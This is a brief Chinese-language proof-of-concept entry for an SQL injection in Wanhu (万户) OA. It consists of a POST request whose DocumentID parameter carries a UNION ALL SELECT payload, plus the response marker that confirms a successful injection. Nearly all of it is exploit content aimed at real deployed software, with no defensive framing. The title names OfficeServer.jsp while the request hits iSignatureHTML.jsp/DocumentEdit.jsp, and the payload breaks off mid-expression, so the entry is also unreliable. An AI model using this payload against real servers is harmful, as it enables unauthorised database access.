# 万户OAOfficeServer.jsp存在SQL注入漏洞测一

万户 ｜ SQL注入 ｜ —
- **请求**：`POST /defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)%7C%7CCHR(107)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(113`
- **响应特征**：-1 qkqpqDHtqkqpq